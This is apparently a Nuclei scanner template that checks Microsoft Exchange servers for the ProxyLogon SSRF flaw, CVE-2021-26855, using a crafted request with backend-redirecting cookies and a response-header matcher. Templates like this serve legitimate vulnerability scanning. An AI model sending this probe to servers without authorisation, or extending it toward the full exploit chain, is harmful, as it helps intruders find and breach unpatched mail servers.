id: cve-2021-26855
info:
  name: Exchange Server SSRF Vulnerability
  author: madrobot
  severity: critical
  description: |
    ProxyLogon is an exploit chain of the following vulnerabilities:
    * CVE-2021-26855: Server-Side Request Forgery (SSRF)
    * CVE-2021-26857: Insecure Deserialization
    * CVE-2021-26858: Arbitrary File Write	
    * CVE-2021-27065: Arbitrary File Write
    Thie rule checks for CVE-2021-26855, which is enough to tell whether a target is vulnerable or not
  tags: cve,cve2021,ssrf,rce,exchange
  reference: |
    - https://proxylogon.com/#timeline
    - https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
    - https://www.shodan.io/search?query=vuln%3ACVE-2021-26855
    - https://gist.github.com/testanull/324546bffab2fe4916d0f9d1f03ffa09
requests:
  - raw:
      - |
        GET /owa/auth/x.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Cookie: X-AnonResource=true; X-AnonResource-Backend=somethingnonexistent/ecp/default.flt?~3; X-BEResource=somethingnonexistent/owa/auth/logon.aspx?~3;
        Accept-Language: en
        Connection: close
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
          - 503
      - type: word
        words:
          - "X-Calculatedbetarget: somethingnonexistent"
        part: header